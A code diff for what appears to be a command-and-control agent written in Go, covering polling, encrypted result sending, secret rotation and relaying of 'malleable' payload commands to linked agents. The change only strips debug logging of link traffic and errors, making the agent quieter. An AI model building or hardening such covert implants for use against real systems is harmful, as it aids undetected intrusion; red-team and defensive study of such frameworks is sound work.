@@ -555,11 +555,6 @@ func sendImmediateLinkData(secureComms *SecureComms, customHeaders map[string]st
 		return
 	}
 
-	log.Printf("[LINK] sendImmediateLinkData: sending %d items", len(linkData))
-	for i, ld := range linkData {
-		log.Printf("[LINK] ImmediateData[%d]: routingID=%s, payloadLen=%d", i, ld.RoutingID, len(ld.Payload))
-	}
-
 	// Build payload with only link data
 	payload := make(map[string]interface{})
 	payload[pollKeyAgentID] = clientID
@@ -567,7 +562,6 @@ func sendImmediateLinkData(secureComms *SecureComms, customHeaders map[string]st
 
 	jsonData, err := json.Marshal(payload)
 	if err != nil {
-		log.Printf("[LINK] sendImmediateLinkData: json.Marshal failed: %v", err)
 		// Re-queue the data so it's not lost
 		requeueLinkData(linkData)
 		return
@@ -575,18 +569,15 @@ func sendImmediateLinkData(secureComms *SecureComms, customHeaders map[string]st
 
 	encrypted, err := secureComms.EncryptMessage(string(jsonData))
 	if err != nil {
-		log.Printf("[LINK] sendImmediateLinkData: EncryptMessage failed: %v", err)
 		// Re-queue the data so it's not lost
 		requeueLinkData(linkData)
 		return
 	}
 
 	if err := sendResults(encrypted, customHeaders); err != nil {
-		log.Printf("[LINK] sendImmediateLinkData: sendResults failed: %v - requeueing", err)
 		// Re-queue the data so it's not lost - will be sent on next poll cycle
 		requeueLinkData(linkData)
 	} else {
-		log.Printf("[LINK] sendImmediateLinkData: SUCCESS, sent %d items, rotating secret", len(linkData))
 		secureComms.RotateSecret()
 	}
 }
@@ -607,8 +598,6 @@ func processLinkCommands(linkCmds []interface{}) {
 	// Timeout for waiting for command responses
 	const commandResponseTimeout = 5 * time.Second
 
-	log.Printf("[LINK] processLinkCommands: processing %d link commands", len(linkCmds))
-
 	for _, cmd := range linkCmds {
 		cmdMap, ok := cmd.(map[string]interface{})
 		if !ok {
@@ -620,7 +609,6 @@ func processLinkCommands(linkCmds []interface{}) {
 		payload, _ := cmdMap[MALLEABLE_PAYLOAD_FIELD].(string)
 
 		if routingID == "" || payload == "" {
-			log.Printf("[LINK] Skipping invalid link command: routingID=%s, payloadLen=%d", routingID, len(payload))
 			continue
 		}
 
@@ -639,9 +627,6 @@ func processLinkCommands(linkCmds []interface{}) {
 			transformed = true
 		}
 
-		log.Printf("[LINK] Forwarding command to routingID=%s, payloadLen=%d, transformed=%v, prependLen=%d, appendLen=%d",
-			routingID, len(payload), transformed, prependLen, appendLen)
-
 		// Forward to the linked agent and wait for response
 		var response *LinkDataOut
 		var err error
@@ -655,16 +640,13 @@ func processLinkCommands(linkCmds []interface{}) {
 		}
 
 		if err != nil {
-			log.Printf("[LINK] ForwardToLinkedAgent error for routingID=%s: %v", routingID, err)
 			continue
 		}
 
 		if response == nil {
-			log.Printf("[LINK] ForwardToLinkedAgent returned nil response for routingID=%s (timeout?)", routingID)
 			continue
 		}
 
-		log.Printf("[LINK] Got response from routingID=%s, payloadLen=%d", routingID, len(response.Payload))
 		lm.queueOutboundData(response)
 	}
 }
@@ -807,12 +789,6 @@ func startPolling(config PollConfig, sysInfo *SystemInfoReport) error {
 			// Collect unlink notifications (routing IDs that have been disconnected)
 			unlinkNotifications := GetLinkManager().GetUnlinkNotifications()
 
-			log.Printf("[LINK] Collected from children: linkData=%d, linkHandshake=%v, unlinkNotifications=%d",
-				len(linkData), linkHandshake != nil, len(unlinkNotifications))
-			for i, ld := range linkData {
-				log.Printf("[LINK] LinkData[%d]: routingID=%s, payloadLen=%d", i, ld.RoutingID, len(ld.Payload))
-			}
-
 			// Handle pending results before sleep
 			hasResults := resultManager.HasResults()
 			hasLinkData := len(linkData) > 0
@@ -821,8 +797,6 @@ func startPolling(config PollConfig, sysInfo *SystemInfoReport) error {
 
 			if hasResults || hasLinkData || hasLinkHandshake || hasUnlinkNotifications {
 				results := resultManager.GetPendingResults()
-				log.Printf("[LINK] Building response: results=%d, linkData=%d, hasHandshake=%v, unlinkNotifications=%d",
-					len(results), len(linkData), hasLinkHandshake, len(unlinkNotifications))
 				payload := make(map[string]interface{})
 				payload[pollKeyAgentID] = clientID
 
